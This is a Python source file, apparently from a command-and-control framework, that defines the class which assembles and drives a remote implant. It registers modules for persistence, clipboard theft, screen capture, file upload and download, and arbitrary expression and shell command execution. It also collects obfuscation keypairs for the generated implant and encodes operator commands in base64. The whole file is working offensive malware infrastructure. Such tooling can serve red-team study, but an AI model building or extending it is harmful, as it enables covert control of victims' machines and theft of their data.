from Implant.implant_core.download_file import DownloadFile
from Implant.implant_core.upload_file import UploadFile
from Implant.implant_core.play_audio import PlayAudio
from Implant.implant_core.enable_persistence import EnablePersistence
from Implant.implant_core.export_clipboard import ExportClipboard
from Implant.implant_core.system_info import SystemInfo
from Implant.implant_core.load_module import LoadModule
from Implant.implant_core.invoke_expression import InvokeExpression
from Implant.implant_core.get_loaded_modules import GetLoadedModules
from Implant.implant_core.screen_capture import ScreenCapture

from Data.Database import Database

from base64 import b64encode

class ImplantFunctionality:
    def __init__(self):
        # get the modules from implant_core
        self.module_list = []
        self.module_list.append(DownloadFile())
        self.module_list.append(UploadFile())
        self.module_list.append(PlayAudio())
        self.module_list.append(EnablePersistence())
        self.module_list.append(ExportClipboard())
        self.module_list.append(SystemInfo())
        self.module_list.append(LoadModule())
        self.module_list.append(InvokeExpression())
        self.module_list.append(GetLoadedModules())
        self.module_list.append(ScreenCapture())

    def get_list_of_implant_text(self):
        # Returns a list of implant text values for constucting the implant.
        implant_text = []
        for module in self.module_list:
            implant_text.append(module.implant_text())
        return implant_text

    def get_obfucation_string_dict(self):
        to_return = {}
        for module in self.module_list:
            try:
                to_return.update(module.obfuscation_keypairs)
            except:
                print(f"Issue with {module} obfuscation_keypair value.")
        return to_return
    def command_listing(self):
        command_list = []
        for module in self.module_list:
            command_list.append({"type": module.type,
                                 "args": module.args,
                                 "input": module.input
                                 })
        return command_list

    def _get_module_object_by_type_(self, type_str):

        for implant_module in self.module_list:
            if implant_module.type == type_str:
                return implant_module

    def process_command_response(self, command_entry, raw_command_result):
        # Takes a module type value, and the result and passes the raw result to the module process_implant_response
        db = Database()
        a = db.implant.get_registered_implant_commands_by_command_id(command_entry)
        command_entry = a['log_entry']
        host_data = None
        response_string = raw_command_result

        implant_module= self._get_module_object_by_type_(command_entry['type'])
        if implant_module is not None:
            response_string, host_data = implant_module.process_implant_response(
                raw_command_result, command_entry['args'])
        elif command_entry['type'] == "CM":
            response_string = f"Command: {command_entry['args']}\nResult: {raw_command_result.decode()}"
        # failure checks required.
        return response_string, host_data

    def validate_pre_registered_command(self, command_dict):
        # This function will validate the arguments of a command against it's modules checks.
        # Commonly we will be checking if a file exists on disk, i.e. modules, or upload files.
        #
        # If the module passes checks return bool:True, or string: reason if it does not pass the checks.
        if command_dict['type'] == "CM":
            return True
        for implant_module in self.module_list:
            if implant_module.type == command_dict['type']:
                return implant_module.pre_process_command(command_dict['args'])

    def create_module_data_string(self, command_dict):
        for implant_module in self.module_list:
            if implant_module.type == command_dict.log_entry['type']:

                arg_string = implant_module.create_module_data_string(command_dict.log_entry)

                to_ret = f"{command_dict.log_entry['type']}{command_dict.command_id}{arg_string}"
                # print(f"TESTING:\ndict: {command_dict.__dict__}\narg:  {arg_string}\nret:  {to_ret}")
                return to_ret
            elif command_dict.log_entry['type'] == "CM":
                arg = b64encode(command_dict.log_entry['args'].encode()).decode()
                to_ret = f"{command_dict.log_entry['type']}{command_dict.command_id}{arg}"
                return  to_ret

